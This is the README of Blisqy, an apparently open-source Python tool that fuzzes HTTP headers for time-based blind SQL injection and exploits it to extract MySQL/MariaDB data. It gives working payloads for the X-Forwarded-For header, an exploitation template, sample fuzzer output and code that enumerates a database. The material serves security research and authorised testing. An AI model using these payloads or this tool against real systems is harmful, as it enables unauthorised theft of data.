# 1. Blisqy

Blisqy is a tool to aid Web Security researchers to find Time-based Blind SQL injection on HTTP Headers and also exploitation of the same vulnerability.

The exploitation enables slow data siphon from a database (currently supports MySQL/MariaDB only) using bitwise operation on printable ASCII characters, via a blind-SQL injection.

For interoperability with other Python tools and to enable other users utilise the features provided in Blisqy, the modules herein can be imported into other Python based scripts.

When testing for Time-based Blind SQL injections, any network lag or congestion can affect the effectiveness of your fuzzing or exploitation. To compensate for the possible network lags and uncertainties that might cause delays, Blisqy time comparison is dynamic and it's calculated at runtime for each test. The tests utilizes `greenlet`(alight-weight cooperatively-scheduled execution unit) to provide a high-level synchronous API on top of `libevevent` loop. It provides a fast and efficient way of carrying out the payload tests in a short time, also, one particular test should not affect  another because they are not fully done in a sequential method.

## 1.1. New Feature(s)

Blisqy now supports fuzzing for Time-based Blind SQL Injection on HTTP Headers and the main functionalities (fuzzing and exploitation) separated to independent files for portability.

## 1.2. Fuzzing with Blisqy

To use the Fuzzing functionality, import the following module in your Python script and provide a target along with the fuzzing data as shown below:

```python
from lib.blindfuzzer import blindSeeker
```

Target parameters should be in a Dictionary/JSON format, for example (*Note the variable data-types)*:

```python
    Server = '192.168.56.101'
    Port = 80
    Index = 1
    Method = 'GET'
    Headerfile = "fuzz-data/headers/default_headers.txt"
    Injectionfile = "fuzz-data/payloads/mysql_time.txt"

    target_params = {
        'server': Server,
        'port': Port,
        'index': Index,
        'headersFile': Headerfile,
        'injectionFile': Injectionfile,
        'method': Method
    }
```

Invoking the fuzzer once the target parameters are provided is as shown below :

```python
vulns = blindSeeker(target_params)
vulns.fuzz()
```

You can checkout `FindBlindSpot.py` for this example provided.

### 1.2.1. Sample Fuzzing Output

If you are successful, you should get a report of the 'injectable' tests carried out. Please note, as much as Blisqy tries to compensate for network lags and congestion while testing it's is important to proof-test the reported positive tests before proceeding.

Below is a sample report:

```text
=================== [ Key Terms] ===================
Index = Configured Constant (Delay)
Base Index Record = Server Ping Before Fuzzing
Benching Record  = Base Index Record + Index
Fuzzing Record = Time taken to process request with Index

===================== [ Logic] =====================
If Fuzzing Record is greater than Benching Record,
treat as a positive; else, treat as a negative.



[+] Injection : X-Forwarded-For : ' or sleep(1)#

[+] Header : X-Forwarded-For

[*] Index Record : 0.000160932540894
[*] Benching Record : 1.00016093254
[*] Fuzzing Record : 9.01
[!] Test 436 is Injectable.
__________________________________

[+] Injection : X-Forwarded-For : ' or sleep(1)='

[+] Header : X-Forwarded-For

[*] Index Record : 0.000378847122192
[*] Benching Record : 1.00037884712
[*] Fuzzing Record : 18.02
[!] Test 438 is Injectable.
__________________________________
```

Screenshot of Blisqy Fuzzer in action:

![Fuzz for Blind SQLi](https://i.imgur.com/Bc8M3V7.png)

## 1.3. Exploitation with Blisqy

After finding a potential Time-based Blind SQL injection, you can prepare a script to Exploit the vulnerable Web application.

Just as the fuzzer, you can import the module for exploitation in your Python script and define a template for the exploitation operation. Below is an example of how to import the module in a Python script:

```python
from lib.blindexploit import SqlEngine
```

Next, you will need to provide details of your target along with it's target parameters for exploitation. Below is a sample implementation of exploiting the found blind sql injection found by the fuzzer:

The target data should be in a Dictionary/JSON format specifying the server, port, the found vulnerable header and it's value (some applications will need or check for a certain value). Also *Note the variable data-types*.

```python
target = {
    'server': '192.168.56.101',
    'port': 80,
    'vulnHeader': 'X-Forwarded-For',
    'headerValue': 'fuzzer'
}
```

Target parameters should follow allowing the user to specify some options related to the exploitation preferences.

```python
targetParam = {
    'sleepTime': 0.1,
    'payload': 'pass',
    'mysqlDig': 'yes',
    'interactive': 'on',
    'verbosity': 'high'
}
```

- **sleepTime** is the delay to be used in the payloads
- **payload** is an option to run the exploitation with a custom SQL query e.g. `select @@hostname`. The default option is `'pass'`.
- **mysqlDig** enables the exploitation to be automatic and to enumerate all the available tables in the schema.
- **interactive** is an option to enable the user interact with the exploitation routine. This can be handy when you want to skip to the interesting parts of the DB.
- **verbosity** can be high, medium or low. This just controls the output information from the exploitation routine.

After providing your target and its parameters, the next thing to provide is a template for the exploitation routine. Blisqy provides a way users can specify where to inject the exfiltration SQL payload and the `sleeptime` delay. Below is an example of an implementation for one of the found vulnerabilities on the sample report provided in the previous subsection.

Found injection on X-Forwarded-For header:

```sql
' or sleep(1)='
```

Template for this particular injection:

```sql
sqli = "' or if((*sql*),sleep(*time*),0) and '1'='1"
```

During runtime, the `*sql*` will be replaced with an SQL injection payload and `*time*` will be replaced with a delay for sleep().

Once all these are done, the last part is to instantiate the exploitation routine and let the `MysqlDigger()` method do the working.

```python
# Create an instance
BlindSql = SqlEngine(target, targetParam, sqli)

# Enumerate the MySql Database
BlindSql.MysqlDigger()
```

You can check `ExploitBlindSpot.py` for this example provided.

Below is an example of an exploitation operation:

![Exploit Blind SQLi](https://i.imgur.com/HfKoJrz.png)

## 1.4. To Do

- ~~Integrate an intelligent Fuzzer for hunting SQL injection vulnerability(ies) on HTTP Headers and Web Elements~~
- Support Blind-SQLi fuzzing and exploitation on WEB endpoints apart from HTTP Headers.

### 1.4.1. Contribute

You can alert me of anything interesting you've found with Blisqy or what you think should be added/removed.

- Share your ideas and wishlist,
- Spot a typo? Lemme know,
- Found ways we can optimise Blisqy?,
- Suggest ways to incorporate support for other DBMS.

### 1.4.2. Reference

- (PDF) Time-Based Blind SQL Injection via HTTP Headers: Fuzzing and Exploitation.. Available from: [https://www.researchgate.net/publication/328880240_Time-Based_Blind_SQL_Injection_via_HTTP_Headers_Fuzzing_and_Exploitation](https://www.researchgate.net/publication/328880240_Time-Based_Blind_SQL_Injection_via_HTTP_Headers_Fuzzing_and_Exploitation)

- PentesterLab - From SQL Injection to Shell II [https://pentesterlab.com/exercises/from_sqli_to_shell_II/course](https://pentesterlab.com/exercises/from_sqli_to_shell_II/course)
